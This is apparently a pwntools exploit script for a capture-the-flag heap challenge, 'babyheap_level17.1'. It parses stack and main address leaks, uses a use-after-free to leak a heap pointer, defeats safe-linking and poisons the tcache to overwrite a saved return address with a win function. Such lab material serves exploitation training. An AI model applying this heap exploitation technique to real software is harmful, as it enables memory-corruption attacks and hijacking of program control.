#!/usr/bin/env python3

from pwn import * 

binary = './babyheap_level17.1_patched'
p = process(binary)

s = '''
b malloc
b free
'''



context.log_level = 'debug'

# parsing the address leak 
p.recvuntil("[LEAK] The local stack address of your allocations is at: ")
stack_leak_str = p.recvline().strip().decode()
stack_leak = int(stack_leak_str.rstrip('.'), 16)  # Remove trailing period if present

p.recvuntil("[LEAK] The address of main is at: ")
main_leak_str = p.recvline().strip().decode()
main_leak = int(main_leak_str.rstrip('.'), 16)  # Remove trailing period if present

# Now you can use these leaks
log.success(f"Stack leak: {hex(stack_leak)}")
log.success(f"Main leak: {hex(main_leak)}")



win = main_leak - 0x11b
rip = stack_leak + 0x118



p.sendline("malloc 0 100")
p.sendline("malloc 1 100")

p.sendline(b"scanf")
p.sendline("1") # 0 becomes rip_addr
p.sendline("AA") # 8 bytes before destination


p.sendline("free 0")
p.sendline("free 1")

p.sendline("puts 0")

p.recvuntil(b"Data: ")
leak_data = int.from_bytes(p.recvline().strip(), 'little')
log.success(f"Heap address: 0x{leak_data:x}") # Keep only the lower 5 bytes (0x55e6ea22e)
# Shift and add the chunk offset
chunk_addr = (leak_data << 12) + 0x330
log.success(f"Heap address: 0x{chunk_addr:x}")



mangled_rip = ((chunk_addr >> 12 ) ^ (stack_leak))


# 1 0

# uaf
# overwriting the next* pointer 
p.sendline(b"scanf")
p.sendline("1") # 0 becomes rip_addr
p.sendline(p64(mangled_rip)) # 8 bytes before destination


p.sendline("malloc 1 100")


p.sendline("malloc 0 100")






p.sendline(b"scanf")
p.sendline("0") 
p.sendline(p64(rip))




p.sendline("scanf")
p.sendline("0") 
p.sendline(p64(win))




p.sendline("quit")
p.interactive()








